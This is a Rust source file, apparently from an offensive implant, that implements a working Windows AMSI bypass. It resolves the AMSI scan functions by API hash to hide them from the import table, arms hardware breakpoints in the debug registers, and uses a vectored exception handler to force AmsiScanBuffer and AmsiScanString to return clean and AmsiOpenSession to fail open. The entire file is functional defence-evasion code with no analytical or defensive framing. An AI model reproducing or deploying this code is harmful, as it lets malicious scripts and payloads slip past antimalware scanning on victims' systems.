#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::EXCEPTION_SINGLE_STEP,
    System::{
        Diagnostics::Debug::{
            AddVectoredExceptionHandler, EXCEPTION_POINTERS,
            SetThreadContext, GetThreadContext, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
        },
        Threading::GetCurrentThread,
        // LoadLibraryA is still needed to force amsi.dll into memory.
        LibraryLoader::LoadLibraryA,
    },
};

#[cfg(target_os = "windows")]
static mut AMSI_ADDR: usize = 0;

#[cfg(target_os = "windows")]
static mut AMSI_SCAN_STRING_ADDR: usize = 0;

#[cfg(target_os = "windows")]
static mut AMSI_OPEN_SESSION_ADDR: usize = 0;

#[cfg(target_os = "windows")]
pub unsafe fn install_amsi_bypass() {
    use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};

    const AMSI_H: u32 = djb2_hash_lower(b"amsi.dll");

    // Try PEB first; if not loaded, force-load then re-check PEB.
    #[cfg(target_arch = "x86_64")]
    let amsi_base: *const u8 = {
        let b = peb_get_module_base(AMSI_H);
        if b.is_null() {
            LoadLibraryA(b"amsi.dll\0".as_ptr());
            let b2 = peb_get_module_base(AMSI_H);
            if b2.is_null() { return; }
            b2
        } else { b }
    };
    #[cfg(not(target_arch = "x86_64"))]
    let amsi_base: *const u8 = {
        use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
        let mut h = GetModuleHandleA(b"amsi.dll\0".as_ptr()) as *const u8;
        if h.is_null() {
            LoadLibraryA(b"amsi.dll\0".as_ptr());
            h = GetModuleHandleA(b"amsi.dll\0".as_ptr()) as *const u8;
            if h.is_null() { return; }
        }
        h
    };

    // Resolve AMSI functions by hash — no plaintext names in IAT.
    AMSI_ADDR = match resolve_by_hash(amsi_base, djb2_hash(b"AmsiScanBuffer")) {
        Some(p) => p as usize,
        None    => return,
    };
    AMSI_SCAN_STRING_ADDR = match resolve_by_hash(amsi_base, djb2_hash(b"AmsiScanString")) {
        Some(p) => p as usize,
        None    => 0,
    };
    AMSI_OPEN_SESSION_ADDR = match resolve_by_hash(amsi_base, djb2_hash(b"AmsiOpenSession")) {
        Some(p) => p as usize,
        None    => 0,
    };

    AddVectoredExceptionHandler(1, Some(amsi_veh_handler));

    let thread = GetCurrentThread();
    let mut ctx: CONTEXT = core::mem::zeroed();
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
    GetThreadContext(thread, &mut ctx);
    ctx.Dr0  = AMSI_ADDR as u64;
    ctx.Dr7 |= 0x1;
    if AMSI_SCAN_STRING_ADDR != 0 {
        ctx.Dr2  = AMSI_SCAN_STRING_ADDR as u64;
        ctx.Dr7 |= 0x10;
    }
    if AMSI_OPEN_SESSION_ADDR != 0 {
        ctx.Dr3  = AMSI_OPEN_SESSION_ADDR as u64;
        ctx.Dr7 |= 0x40;
    }
    SetThreadContext(thread, &ctx);
}

#[cfg(target_os = "windows")]
unsafe extern "system" fn amsi_veh_handler(info: *mut EXCEPTION_POINTERS) -> i32 {
    const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
    const EXCEPTION_CONTINUE_SEARCH:    i32 =  0;

    let record  = &*(*info).ExceptionRecord;
    let context = &mut *(*info).ContextRecord;

    if record.ExceptionCode == EXCEPTION_SINGLE_STEP {
        if context.Rip == AMSI_ADDR as u64 || context.Rip == AMSI_SCAN_STRING_ADDR as u64 {
            context.Rax = 0;
            context.Rip = *(context.Rsp as *const u64);
            context.Rsp += 8;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        if context.Rip == AMSI_OPEN_SESSION_ADDR as u64 {
            context.Rax = 0x80070057u64; // E_INVALIDARG — causes AMSI to fail open
            context.Rip = *(context.Rsp as *const u64);
            context.Rsp += 8;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    EXCEPTION_CONTINUE_SEARCH
}
